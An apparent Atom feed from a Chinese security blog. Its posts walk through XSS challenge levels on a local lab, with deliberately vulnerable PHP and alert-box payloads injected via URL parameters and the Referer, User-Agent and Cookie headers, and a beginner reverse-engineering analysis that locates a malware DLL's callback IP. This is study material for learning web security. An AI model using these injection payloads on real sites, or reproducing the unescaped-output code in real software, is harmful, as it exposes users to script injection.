<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>jianghuxia&#39;s blog</title>
  
  <subtitle>Everyday very nice!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jianghuxia.github.io/"/>
  <updated>2019-09-02T09:39:08.484Z</updated>
  <id>https://jianghuxia.github.io/</id>
  
  <author>
    <name>jianghuxia</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xss练习（二）</title>
    <link href="https://jianghuxia.github.io/2019/08/28/xss%E7%BB%83%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://jianghuxia.github.io/2019/08/28/xss练习（二）/</id>
    <published>2019-08-28T07:37:51.000Z</published>
    <updated>2019-09-02T09:39:08.484Z</updated>
    
    <content type="html"><![CDATA[<p>跨站脚本攻击（Cross Site Script），为避免与（Cascading Style Sheet，CSS）重名，安全领域我们称为”XSS”。<br><a id="more"></a> </p><h1 id="XSS练习"><a href="#XSS练习" class="headerlink" title="XSS练习"></a>XSS练习</h1><h2 id="第十一关（构造REFERER头部进行XSS）"><a href="#第十一关（构造REFERER头部进行XSS）" class="headerlink" title="第十一关（构造REFERER头部进行XSS）"></a>第十一关（构造<code>REFERER</code>头部进行<code>XSS</code>）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析一下，与上关差不多，既然传的参数<code>keyword</code>和<code>t_sort</code>都被<code>htmlspecialchars</code>过滤了，考虑到<code>HTTP_REFERER</code>的<code>HTTP</code>请求头，我们可以尝试能否在<code>HTTP_REFERER</code>构造一个参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REFERER : xss&quot; onmousemove = &quot;alert(/xss/)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>通过<code>BurpSuite</code>抓包添加<code>REFERER</code>头部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /xss/level11.php?keyword=good%20job! HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.2; zh-CN; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.5</span><br><span class="line">Accept-Charset: GB2312,utf-8;q=0.7,*;q=0.7</span><br><span class="line">Referer: xss&quot; onmousemove = &quot;alert(/xss/)&quot; type=&quot;text&quot; </span><br><span class="line">Keep-Alive: 115</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="/2019/08/28/xss练习（二）/1563498997033.png" alt="1563498997033"></p><h2 id="第十二关（构造User-Agent头部进行XSS）"><a href="#第十二关（构造User-Agent头部进行XSS）" class="headerlink" title="第十二关（构造User_Agent头部进行XSS）"></a>第十二关（构造<code>User_Agent</code>头部进行<code>XSS</code>）</h2><p>看到源代码就差不多知道是通过读取<code>User-Agent</code>的头部数据，所以直接构造</p><p><img src="/2019/08/28/xss练习（二）/1563499760171.png" alt="1563499760171"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.2; zh-CN; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) &quot; onmousemove=&quot;alert(/xss/)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>通过，那么看看源代码猜测下,发现的确如此</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ua&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="第十三关（构造Set-Cookie头部进行XSS）"><a href="#第十三关（构造Set-Cookie头部进行XSS）" class="headerlink" title="第十三关（构造Set-Cookie头部进行XSS）"></a>第十三关（构造<code>Set-Cookie</code>头部进行<code>XSS</code>）</h2><p><img src="/2019/08/28/xss练习（二）/1563499948741.png" alt="1563499948741"></p><p>看到这里，故伎重演下，尝试更改<code>Set-Cookies</code>头部，成功进入第十四关</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: " onmousemove="alert(/xss/)" type="text"</span><br></pre></td></tr></table></figure><p>接着我们看下源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_COOKIE[&quot;user&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_cook&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="第十四关（略过）"><a href="#第十四关（略过）" class="headerlink" title="第十四关（略过）"></a>第十四关（略过）</h2><p>初步没看出什么花样</p><p><img src="/2019/08/28/xss练习（二）/1563500324137.png" alt="1563500324137"></p><p>查看下源代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level14<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level14<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>需要<code>fq</code>，那就直接<code>15</code>关吧</p><p>第十五关</p><p>源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level16.php?keyword=test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>初次遇到<code>ng-include</code>，先度一下</p><p><img src="/2019/08/28/xss练习（二）/1563517544505.png" alt="1563517544505"></p><p><code>AngularJS ng-include</code>指令，注意，该指令默认情况下，包含的文件需要包含同一个域名下，说来说句就是一个包含文件的命令。</p><p>放个链接，后面的有点看不懂，先记录至此。</p><p><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></p><p><a href="https://www.cnblogs.com/r00tuser/p/7407459.html" target="_blank" rel="noopener">某xss挑战赛闯关笔记</a></p><p>第关</p><p>第关</p><p>第关</p><p>第关</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;跨站脚本攻击（Cross Site Script），为避免与（Cascading Style Sheet，CSS）重名，安全领域我们称为”XSS”。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="XSS" scheme="https://jianghuxia.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>exe分析（一）</title>
    <link href="https://jianghuxia.github.io/2019/08/22/exe%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://jianghuxia.github.io/2019/08/22/exe分析（一）/</id>
    <published>2019-08-22T02:56:56.000Z</published>
    <updated>2019-09-02T09:40:09.523Z</updated>
    
    <content type="html"><![CDATA[<p>这是某道逆向师傅教的新手题，兴趣使然，分析学习一下<br><a id="more"></a> </p><h1 id="某恶意样本主机分析"><a href="#某恶意样本主机分析" class="headerlink" title="某恶意样本主机分析"></a>某恶意样本主机分析</h1><h2 id="验证主机运行程序数字签名情况"><a href="#验证主机运行程序数字签名情况" class="headerlink" title="验证主机运行程序数字签名情况"></a>验证主机运行程序数字签名情况</h2><p>首先使用工具<code>PCHunter32.exe</code>，验证的是否存在数字签名，没有存在数字签名的被标注成粉紫色</p><p><img src="/2019/08/22/exe分析（一）/1566889351387.png" alt="1566889351387"></p><p>可以看到名为<code>Ias</code>的动态链接库<code>C:\WINDOWS\system32\Iasex.dll</code>疑似恶意程序</p><p><img src="/2019/08/22/exe分析（一）/1566960743394.png" alt="1566960743394"></p><h2 id="查看恶意dll的pid进程号"><a href="#查看恶意dll的pid进程号" class="headerlink" title="查看恶意dll的pid进程号"></a>查看恶意<code>dll</code>的<code>pid</code>进程号</h2><p>使用<code>procexp.exe</code>查看<code>pid</code>的<code>16</code>进制值，点击下图标签<code>Find</code>–&gt;<code>Find Mandle or DLL</code></p><p><img src="/2019/08/22/exe分析（一）/1566957909585.png" alt="1566957909585"></p><p>输入<code>Iase</code>，查找相关的<code>dll</code>文件</p><p><img src="/2019/08/22/exe分析（一）/1566889701430.png" alt="1566889701430"></p><p>再使用<code>IDA6.8</code>在<code>Import</code>搜索名为<code>connect</code>的函数，获得系统函数地址<code>10012490</code>，但这并不是调用的地址哦</p><h2 id="使用IDA查找函数地址"><a href="#使用IDA查找函数地址" class="headerlink" title="使用IDA查找函数地址"></a>使用<code>IDA</code>查找函数地址</h2><p><img src="/2019/08/22/exe分析（一）/1566888889357.png" alt="1566888889357"></p><p>双击点进去，发现该函数所占据的空间地址</p><p><img src="/2019/08/22/exe分析（一）/1566957416113.png" alt="1566957416113"></p><p>然后按下<code>Ctrl+x</code>，跳进调用地址看看</p><p><img src="/2019/08/22/exe分析（一）/1566958167350.png" alt="1566958167350"></p><p>发现调用地址<code>10001DE4</code></p><p><img src="/2019/08/22/exe分析（一）/1566958230819.png" alt="1566958230819"></p><h2 id="查看connect函数使用方法"><a href="#查看connect函数使用方法" class="headerlink" title="查看connect函数使用方法"></a>查看<code>connect</code>函数使用方法</h2><p>百度搜索<code>“connect msdn”</code>,点击第一个</p><p><img src="/2019/08/22/exe分析（一）/1566963709544.png" alt="1566963709544"></p><p>关于<code>connect</code>函数我们可以登录官方网址</p><p><img src="/2019/08/22/exe分析（一）/1566890578291.png" alt="1566890578291"></p><p>其中还有个<code>SOCKET</code>的地址，再看看其函数结构</p><p><img src="/2019/08/22/exe分析（一）/1566890605940.png" alt="1566890605940"></p><h2 id="使用Odbg分析程序"><a href="#使用Odbg分析程序" class="headerlink" title="使用Odbg分析程序"></a>使用<code>Odbg</code>分析程序</h2><p>然后。。。。。。按下<code>Ctrl+g</code>,输入地址，进行跳转</p><p><img src="/2019/08/22/exe分析（一）/1566958697312.png" alt="1566958697312"></p><p>可以看到，得到最终的结果<code>50 AC 10 1A 26</code></p><p><img src="/2019/08/22/exe分析（一）/1566960395472.png" alt="1566960395472"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hex(50)------&gt;80</span><br><span class="line">hex(AC)------&gt;172</span><br><span class="line">hex(10)------&gt;16</span><br><span class="line">hex(1A)------&gt;26</span><br><span class="line">hex(26)------&gt;38</span><br></pre></td></tr></table></figure><p>所得<code>ip</code>也就是<code>172.16.26.38</code>，端口<code>80</code></p><p>我们再看看堆栈段，这样就很明显了啦</p><p><img src="/2019/08/22/exe分析（一）/1566963532152.png" alt="1566963532152"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是某道逆向师傅教的新手题，兴趣使然，分析学习一下&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="逆向分析" scheme="https://jianghuxia.github.io/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>xss练习（一）</title>
    <link href="https://jianghuxia.github.io/2019/08/15/xss%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://jianghuxia.github.io/2019/08/15/xss练习（一）/</id>
    <published>2019-08-15T08:36:53.000Z</published>
    <updated>2019-09-02T09:40:20.579Z</updated>
    
    <content type="html"><![CDATA[<p>跨站脚本攻击（Cross Site Script），为避免与（Cascading Style Sheet，CSS）重名，安全领域我们称为”XSS”。<br><a id="more"></a> </p><h1 id="XSS练习"><a href="#XSS练习" class="headerlink" title="XSS练习"></a>XSS练习</h1><h2 id="第一关——无任何过滤"><a href="#第一关——无任何过滤" class="headerlink" title="第一关——无任何过滤"></a>第一关——无任何过滤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line"> confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level2.php?keyword=test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>其中核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>GET</code>方式将<code>name</code>的参数值传进去，无任何过滤，如下图，传参<code>ghjkl</code>进去</p><p><img src="/2019/08/15/xss练习（一）/1563429270010.png" alt="1563429270010"></p><p>当攻击者恶意构造如下<code>pyload</code>，将会触发<code>js</code>弹窗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/08/15/xss练习（一）/1563429508980.png" alt="1563429508980"></p><h2 id="第二关——htmlspecialchars-str-部分转化"><a href="#第二关——htmlspecialchars-str-部分转化" class="headerlink" title="第二关——htmlspecialchars($str)部分转化"></a>第二关——<code>htmlspecialchars($str)</code>部分转化</h2><p>核心代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们先尝试下<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p><img src="/2019/08/15/xss练习（一）/1563429982390.png" alt="1563429982390"></p><p>发现<code>&lt;</code>被转换为 <code>&amp;lt;</code>、<code>&gt;</code>被转换为<code>&amp;gt;</code>，仔细查看代码，<code>htmlspecialchars</code>将这些特殊字符转换为 HTML 实体，那现在该怎么办呢？我们发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>我们所填的内容填充在这个文本框中，想想，我们是否可以填入<code>&quot;</code>，将其<code>value</code>的值置为空，闭合双引号，致使input的标签提前结束，后面接着输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>即可弹窗，即最终显示的网页源代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><p>稍稍构造，成功触发</p><p><img src="/2019/08/15/xss练习（一）/1563430430408.png" alt="1563430430408"></p><p>第二关<code>pyload</code>:<code>http://127.0.0.1/xss/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;&quot;</code></p><h2 id="第三关——htmlspecialchars-str-全部转化-单引号"><a href="#第三关——htmlspecialchars-str-全部转化-单引号" class="headerlink" title="第三关——htmlspecialchars($str)全部转化(单引号)"></a>第三关——<code>htmlspecialchars($str)</code>全部转化(单引号)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>完蛋！这下可咋整呀，这个也过滤掉了。</p><p><img src="/2019/08/15/xss练习（一）/1563431340960.png" alt="1563431340960"></p><p>难道弹窗只有<code>script</code>这一种方式吗？有其他的吗？当然有呀。比如我们接下来说的<code>onmouseover=&#39;alert(/xss/)&#39;</code></p><p>通过上面我们发现<code>”</code>、<code>&lt;</code>、<code>&gt;</code>都被转化为<code>html</code>的实体参数了，那单引号呢？我们试试</p><p><img src="/2019/08/15/xss练习（一）/1563431750880.png" alt="1563431750880"></p><p>嗯呢，看来单引号并没有被转化为其他，我们试试刚刚的<code>onmouseover=&#39;alert(/xss/)&#39;</code></p><p><img src="/2019/08/15/xss练习（一）/1563431840352.png" alt="1563431840352"></p><p>很好，接下来只要我们闭合单引号就行啦</p><p><img src="/2019/08/15/xss练习（一）/1563432004678.png" alt="1563432004678"></p><p>第三关<code>pyload</code>:<code>http://127.0.0.1/xss/level3.php?keyword=&#39;onmouseover=&#39;alert(/xss/)</code></p><h2 id="第四关——htmlspecialchars-str-部分转化-双引号拼接、过滤-lt-和-gt"><a href="#第四关——htmlspecialchars-str-部分转化-双引号拼接、过滤-lt-和-gt" class="headerlink" 